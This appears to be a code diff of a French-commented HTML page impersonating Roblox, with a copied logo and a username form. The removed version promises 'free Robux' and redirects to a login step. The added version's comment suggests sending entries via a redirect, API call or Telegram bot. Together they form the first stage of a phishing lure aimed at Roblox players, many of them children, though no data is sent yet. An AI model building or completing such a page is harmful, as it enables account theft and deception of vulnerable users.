@@ -1,288 +1,127 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Événement Roblox</title>
+  <style>
+    /* Reset & Fond de page */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Gotham', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
 
-        body {
-            font-family: 'Inter', -apple-system, sans-serif;
-            background: #0b0e1a;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0;
-            padding: 20px;
-        }
+    body {
+      background-color: #111216;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
 
-        .container {
-            width: 100%;
-            max-width: 380px;
-            text-align: center;
-        }
+    /* Carte Principale (Modal) */
+    .card {
+      background-color: #1b1d22;
+      border: 1px solid #282a30;
+      border-radius: 16px;
+      padding: 32px 24px;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
 
-        /* ============================================================
-           HEADER : Partners Program | How it works?
-           ============================================================ */
-        .header-top {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 32px;
-            padding: 0 2px;
-        }
+    /* Logo Roblox */
+    .logo {
+      width: 150px;
+      margin-bottom: 28px;
+    }
 
-        .header-top .partners {
-            font-size: 14px;
-            font-weight: 600;
-            color: #ffffff;
-            letter-spacing: 0.2px;
-        }
+    /* Zone de Saisie */
+    .input-group {
+      width: 100%;
+      margin-bottom: 16px;
+    }
 
-        .header-top .how-it-works {
-            font-size: 13px;
-            font-weight: 500;
-            color: rgba(255, 255, 255, 0.4);
-            cursor: pointer;
-            transition: color 0.2s;
-        }
+    .input-field {
+      width: 100%;
+      background-color: #111216;
+      border: 1.5px solid #00a257;
+      border-radius: 12px;
+      padding: 14px 16px;
+      color: #ffffff;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
 
-        .header-top .how-it-works:hover {
-            color: #ffffff;
-        }
+    .input-field::placeholder {
+      color: #72767d;
+    }
 
-        /* ============================================================
-           LOGO ROBLOX
-           ============================================================ */
-        .roblox-logo {
-            font-size: 48px;
-            font-weight: 900;
-            color: #ffffff;
-            letter-spacing: -2px;
-            margin-bottom: 8px;
-        }
+    .input-field:focus {
+      box-shadow: 0 0 0 2px rgba(0, 162, 87, 0.3);
+    }
 
-        .roblox-logo .highlight {
-            color: #00b2ff;
-        }
+    /* Bouton Continue */
+    .btn-continue {
+      width: 100%;
+      background-color: #00a257;
+      color: #ffffff;
+      border: none;
+      border-radius: 12px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background-color 0.2s, transform 0.1s;
+    }
 
-        /* ============================================================
-           TEXTE
-           ============================================================ */
-        .subtitle {
-            font-size: 14px;
-            font-weight: 400;
-            color: rgba(255, 255, 255, 0.5);
-            margin-bottom: 24px;
-            line-height: 1.5;
-        }
+    .btn-continue:hover {
+      background-color: #00b662;
+    }
 
-        /* ============================================================
-           CHAMP DE SAISIE
-           ============================================================ */
-        .input-group {
-            margin-bottom: 16px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 16px 18px;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 12px;
-            font-size: 15px;
-            font-family: 'Inter', sans-serif;
-            outline: none;
-            background: rgba(255, 255, 255, 0.03);
-            color: #ffffff;
-            transition: all 0.3s ease;
-            text-align: left;
-        }
-
-        .input-group input::placeholder {
-            color: rgba(255, 255, 255, 0.2);
-            font-weight: 400;
-        }
-
-        .input-group input:focus {
-            border-color: #1DB954;
-            background: rgba(29, 185, 84, 0.04);
-            box-shadow: 0 0 0 4px rgba(29, 185, 84, 0.06);
-        }
-
-        .error-msg {
-            color: #ff3b30;
-            font-size: 12px;
-            margin-top: 6px;
-            display: none;
-            text-align: left;
-        }
-
-        /* ============================================================
-           BOUTON CONTINUE
-           ============================================================ */
-        .btn-continue {
-            width: 100%;
-            background: #1DB954;
-            color: #ffffff;
-            border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: 'Inter', sans-serif;
-            box-shadow: 0 4px 20px rgba(29, 185, 84, 0.2);
-            margin-top: 4px;
-        }
-
-        .btn-continue:hover {
-            transform: scale(1.01);
-            box-shadow: 0 6px 28px rgba(29, 185, 84, 0.3);
-        }
-
-        .btn-continue:active {
-            transform: scale(0.98);
-        }
-
-        .btn-continue:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .btn-content {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-top: 2px solid #ffffff;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* ============================================================
-           RESPONSIVE
-           ============================================================ */
-        @media (max-width: 420px) {
-            .container { padding: 0 8px; }
-            .roblox-logo { font-size: 38px; }
-            .subtitle { font-size: 13px; }
-            .input-group input { font-size: 14px; padding: 14px 16px; }
-            .btn-continue { font-size: 15px; padding: 14px; }
-            .header-top .partners { font-size: 13px; }
-            .header-top .how-it-works { font-size: 12px; }
-        }
-    </style>
+    .btn-continue:active {
+      transform: scale(0.98);
+    }
+  </style>
 </head>
 <body>
 
-    <div class="container">
+  <div class="card">
+    <!-- SVG officiel du logo Roblox en blanc -->
+    <svg class="logo" viewBox="0 0 300 68" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M15.4 0L0 52.6L52.6 68L68 15.4L15.4 0ZM40.9 45.4L22.6 40L28 21.7L46.3 27.1L40.9 45.4Z" fill="white"/>
+      <path d="M92.2 21.6C84.3 21.6 77.9 28 77.9 35.9C77.9 43.8 84.3 50.2 92.2 50.2C100.1 50.2 106.5 43.8 106.5 35.9C106.5 28 100.1 21.6 92.2 21.6ZM92.2 41.8C88.9 41.8 86.3 39.2 86.3 35.9C86.3 32.6 88.9 30 92.2 30C95.5 30 98.1 32.6 98.1 35.9C98.1 39.2 95.5 41.8 92.2 41.8Z" fill="white"/>
+      <path d="M123.7 22H115.3V50H123.7C129.2 50 133.7 45.5 133.7 40V32C133.7 26.5 129.2 22 123.7 22ZM125.3 40C125.3 40.9 124.6 41.6 123.7 41.6H123.7V30.4H123.7C124.6 30.4 125.3 31.1 125.3 32V40Z" fill="white"/>
+      <path d="M150 21.6C142.1 21.6 135.7 28 135.7 35.9C135.7 43.8 142.1 50.2 150 50.2C157.9 50.2 164.3 43.8 164.3 35.9C164.3 28 157.9 21.6 150 21.6ZM150 41.8C146.7 41.8 144.1 39.2 144.1 35.9C144.1 32.6 146.7 30 150 30C153.3 30 155.9 32.6 155.9 35.9C155.9 39.2 153.3 41.8 150 41.8Z" fill="white"/>
+      <path d="M189.5 38.6C188.1 40.5 185.8 41.8 183.3 41.8C179.6 41.8 176.6 38.8 176.6 35.1C176.6 31.4 179.6 28.4 183.3 28.4C185.8 28.4 188.1 29.7 189.5 31.6L195.8 26.8C193 23.2 188.5 20.8 183.3 20.8C175.4 20.8 169 27.2 169 35.1C169 43 175.4 49.4 183.3 49.4C188.5 49.4 193 47 195.8 43.4L189.5 38.6Z" fill="white"/>
+      <path d="M202.8 22H194.4V50H202.8V38.6H212.4V50H220.8V22H212.4V30.2H202.8V22Z" fill="white"/>
+    </svg>
 
-        <!-- ============================================================
-        HEADER
-        ============================================================ -->
-        <div class="header-top">
-            <span class="partners">Partners Program</span>
-            <span class="how-it-works" onclick="alert('How it works?')">How it works?</span>
-        </div>
-
-        <!-- ============================================================
-        LOGO ROBLOX
-        ============================================================ -->
-        <div class="roblox-logo">
-            RO<span class="highlight">BLOX</span>
-        </div>
-
-        <!-- ============================================================
-        TEXTE
-        ============================================================ -->
-        <p class="subtitle">
-            Enter your Roblox username to start getting free Robux
-        </p>
-
-        <!-- ============================================================
-        FORMULAIRE
-        ============================================================ -->
-        <form id="loginForm">
-            <div class="input-group">
-                <input type="text" id="username" placeholder="Type your username ..." autofocus />
-                <div class="error-msg" id="errorMsg">Veuillez entrer un nom d'utilisateur valide.</div>
-            </div>
-
-            <button type="submit" class="btn-continue" id="submitBtn">
-                <span class="btn-content">
-                    <span id="btnText">Continue</span>
-                    <span class="spinner" id="btnSpinner"></span>
-                </span>
-            </button>
-        </form>
-
+    <div class="input-group">
+      <input type="text" id="username" class="input-field" placeholder="Type your username ..." autocomplete="off">
     </div>
 
-    <script>
-        // ============================================================
-        // SOUMISSION
-        // ============================================================
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+    <button type="button" class="btn-continue" id="submitBtn">Continue</button>
+  </div>
 
-            const username = document.getElementById('username').value.trim();
-            const errorMsg = document.getElementById('errorMsg');
-            const submitBtn = document.getElementById('submitBtn');
-            const btnText = document.getElementById('btnText');
-            const btnSpinner = document.getElementById('btnSpinner');
-
-            if (!username || username.length < 2) {
-                errorMsg.style.display = 'block';
-                return;
-            }
-
-            errorMsg.style.display = 'none';
-
-            submitBtn.disabled = true;
-            btnText.textContent = 'Loading...';
-            btnSpinner.style.display = 'block';
-
-            // Simuler envoi
-            setTimeout(() => {
-                // Rediriger vers l'étape 2 (connexion)
-                window.location.href = '?step=login';
-                // ou tu peux faire une alerte pour le test
-                // alert('Username: ' + username + '\nConnexion réussie !');
-                submitBtn.disabled = false;
-                btnText.textContent = 'Continue';
-                btnSpinner.style.display = 'none';
-            }, 1200);
-        });
-
-        // Effacer l'erreur quand l'utilisateur tape
-        document.getElementById('username').addEventListener('input', function() {
-            document.getElementById('errorMsg').style.display = 'none';
-        });
-    </script>
+  <script>
+    document.getElementById('submitBtn').addEventListener('click', function() {
+      const username = document.getElementById('username').value;
+      if (username.trim() !== "") {
+        console.log("Nom d'utilisateur entré :", username);
+        // Ajoute ta logique ici (ex: redirection, appel API ou Bot Telegram)
+      } else {
+        alert("Veuillez entrer un nom d'utilisateur.");
+      }
+    });
+  </script>
 
 </body>
 </html>
+
